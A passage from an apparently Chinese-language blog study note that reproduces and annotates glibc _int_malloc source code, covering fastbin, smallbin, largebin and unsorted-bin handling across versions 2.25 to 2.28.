<span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//if glibc2.26 and after</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_count;            <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REMOVE_FB(fb, victim, pp)                        \</span><br><span class="hljs-meta">  do                                                        \</span><br><span class="hljs-meta">    &#123;                                                        \</span><br><span class="hljs-meta">      victim = pp;                                        \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (victim == NULL)                                \</span><br><span class="hljs-meta">        break;                                                \</span><br><span class="hljs-meta">    &#125;                                                        \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">         != victim);   </span><br></code></pre></div></td></tr></table></figure><h3 id="简单的check"><a href="#简单的check" class="headerlink" title="简单的check"></a>简单的check</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br>  checked_request2size (bytes, nb);<br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-keyword">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ul><li>注意到checked_request2size()是一个宏定义, 可以<strong>改变参数nb的值</strong> </li></ul><h3 id="fastbin-range"><a href="#fastbin-range" class="headerlink" title="fastbin_range"></a>fastbin_range</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h4 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast()))<br>&#123;<br>    idx = fastbin_index(nb);<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> <span class="hljs-comment">//取出第一个fastchunk</span><br>    &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>))<br>        &#123;<span class="hljs-comment">//请求的bytes-&gt;nb-&gt;idx-&gt;fb, 所以idx是按照bytes来确定的, 从这组idx里取出一个fastbinchunk,</span><br>            <span class="hljs-comment">//将他的大小转换为下标, 如果这两个不相等说明fastbin的size段被篡改</span><br>            <span class="hljs-comment">//chunksize(victim) != nb想来也一样吧(?</span><br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">//检查arena,大小,alignment,chunk_size等等</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">//返回用户指针</span><br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = victim-&gt;fd;<br>          <span class="hljs-keyword">else</span><br>            REMOVE_FB (fb, pp, victim);<br>          <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>              <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>                malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>              check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>              <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">                 stash them in the tcache.  */</span><br>              <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>              <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>                &#123;<br>                  mchunkptr tc_victim;<br>                  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                         &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                    &#123;<br>                      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          REMOVE_FB (fb, pp, tc_victim);<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="smallbin-range-2-27"><a href="#smallbin-range-2-27" class="headerlink" title="smallbin_range 2.27"></a>smallbin_range 2.27</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>    &#123;<br>        idx = smallbin_index(nb);<br>        bin = bin_at(av, idx);<br><br>        <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) <span class="hljs-comment">//FIFO</span><br>        &#123;<br>            bck = victim-&gt;bk; <span class="hljs-comment">//取出倒数第二个chunk</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>            set_inuse_bit_at_offset(victim, nb);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br>            check_malloced_chunk(av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">            stash them in the tcache.  */</span><br>            <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>            &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                    &#123;<br>                        bck = tc_victim-&gt;bk;<br>                        set_inuse_bit_at_offset(tc_victim, nb);<br>                        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                            set_non_main_arena(tc_victim);<br>                        bin-&gt;bk = bck;<br>                        bck-&gt;fd = bin;<br><br>                        tcache_put(tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>            <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>###largebin_range</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     If this is a large request, consolidate fastbins before continuing.     </span><br><span class="hljs-comment">    While it might look excessive to kill all fastbins before     </span><br><span class="hljs-comment">    even seeing if there is space available, this avoids     </span><br><span class="hljs-comment">    fragmentation problems normally associated with fastbins.     </span><br><span class="hljs-comment">    Also, in practice, programs tend to have runs of either small or     </span><br><span class="hljs-comment">    large requests, but less often mixtures, so consolidation is not     </span><br><span class="hljs-comment">    invoked all that often in most programs. And the programs that     </span><br><span class="hljs-comment">    it is called frequently in otherwise tend to fragment.   */</span><br><span class="hljs-keyword">else</span><br>&#123;<br>    idx = largebin_index(nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>        malloc_consolidate(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>简而言之就是先执行<a href="#malloc_consolidate">malloc_consolidate</a>(), 合并fastbin中的free chunks</li></ul><h3 id="unsorted-bin-大循环"><a href="#unsorted-bin-大循环" class="headerlink" title="unsorted bin 大循环"></a><em><u>unsorted bin 大循环</u></em></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     </span><br><span class="hljs-comment">    it is exact fit, or, if this a small request, the chunk is remainder from     </span><br><span class="hljs-comment">    the most recent non-exact fit.  Place other traversed chunks in     </span><br><span class="hljs-comment">    bins.  Note that this step is the only place in any routine where     </span><br><span class="hljs-comment">    chunks are placed in bins.     </span><br><span class="hljs-comment">    The outer loop here is needed because we might not realize until     </span><br><span class="hljs-comment">    near the end of malloc that we should have consolidated, so must     </span><br><span class="hljs-comment">    do so and retry. This happens at most once, and only when we would     </span><br><span class="hljs-comment">    otherwise need to expand memory to service a &quot;small&quot; request.   */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br><span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br><span class="hljs-keyword">int</span> return_cached = <span class="hljs-number">0</span>;<br>tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">for</span> (;;)<br>&#123;<br>    <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) <span class="hljs-comment">// 取出链表最后一个, FIFO</span><br>    &#123;<br>        bck = victim-&gt;bk; <span class="hljs-comment">//倒数第二个</span><br>        <span class="hljs-comment">//victim过大或过小都会出错</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||                      __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem(victim), av);<br>        size = chunksize(victim);<br></code></pre></div></td></tr></table></figure><h4 id="victim-last-remainer"><a href="#victim-last-remainer" class="headerlink" title="victim == last_remainer"></a>victim == last_remainer</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">// 如果当前请求位于small chunks的大小范围内</span><br>    <span class="hljs-comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span><br>    <span class="hljs-comment">// 并且 last remainder 的大小分割后还可以作为一个 chunk</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <br>          bck == unsorted_chunks(av) &amp;&amp; <br>          victim == av-&gt;last_remainder &amp;&amp; <br>          (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE)) <span class="hljs-comment">//victim分割出nb后还有MINSIZE</span><br>      &#123;<br>          <span class="hljs-comment">/* split and reattach remainder */</span><br>          remainder_size = size - nb;<br>          <span class="hljs-comment">//分割后剩下的chunk指针</span><br>          remainder = chunk_at_offset(victim, nb);<br>          <span class="hljs-comment">//设置从unsorted bin中割出来的chunk的fd和bk</span><br>          unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>          <span class="hljs-comment">//更新last_remainer</span><br>          av-&gt;last_remainder = remainder;<br>          <span class="hljs-comment">//设置剩下的chunk的fd和bk</span><br>          remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>          &#123;<span class="hljs-comment">//如果是largechunk, 也设置一下nextsize</span><br>              remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>              remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br>          <span class="hljs-comment">//设置两个块的标记bit</span><br>          set_head(victim, nb | PREV_INUSE |<br>                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head(remainder, remainder_size | PREV_INUSE);<br>          set_foot(remainder, remainder_size);<br>          <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>          check_malloced_chunk(av, victim, nb);<br>          <span class="hljs-comment">//返回用户指针</span><br>          <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>          alloc_perturb(p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></div></td></tr></table></figure><h4 id="else-取出victim-准备放入合适的bin中"><a href="#else-取出victim-准备放入合适的bin中" class="headerlink" title="else 取出victim, 准备放入合适的bin中"></a>else 取出victim, 准备放入合适的bin中</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//如果不满足上面的条件, 就往下执行        </span><br><span class="hljs-comment">/* remove from unsorted list */</span> <br><span class="hljs-comment">//取出了victim        </span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2.28特供</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks(av)-&gt;bk = bck;        <br>bck-&gt;fd = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><h4 id="if-exact-fit"><a href="#if-exact-fit" class="headerlink" title="if exact fit"></a>if exact fit</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span> <span class="hljs-comment">//如果有刚好的chunk</span><br>        <span class="hljs-keyword">if</span> (size == nb)<br>        &#123;<br>            set_inuse_bit_at_offset(victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE </span><br>            <span class="hljs-comment">/* Fill cache first, return to user only if cache fills. </span><br><span class="hljs-comment">            We may return one of these chunks later.  */</span> <br>            <span class="hljs-keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>            &#123;<br>                tcache_put(victim, tc_idx);<br>                return_cached = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>     <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span></span><br>                check_malloced_chunk(av, victim, nb);<br>                <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        &#125;<br></code></pre></div></td></tr></table></figure><h4 id="放入small-or-large-bin"><a href="#放入small-or-large-bin" class="headerlink" title="放入small or large bin"></a>放入small or large bin</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/* place chunk in bin */</span><br><span class="hljs-comment">//这一步意味着没有刚好合适的chunk, 所以放入到相应的bin中</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(size))<br>        &#123;<span class="hljs-comment">//如果是smallbin</span><br>            victim_index = smallbin_index(size);<br>            bck = bin_at(av, victim_index);<span class="hljs-comment">//bin数组里的chunk指针</span><br>            fwd = bck-&gt;fd;<span class="hljs-comment">//smallbin链表里的第一个chunk</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<span class="hljs-comment">//如果不是的话就是largebin了</span><br>            victim_index = largebin_index(size);<br>            bck = bin_at(av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-comment">//largebin是有顺序的, 要放在合适的位置, 还要设置fd_nextsize等等</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>            &#123;<span class="hljs-comment">//如果largebin为非空</span><br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop 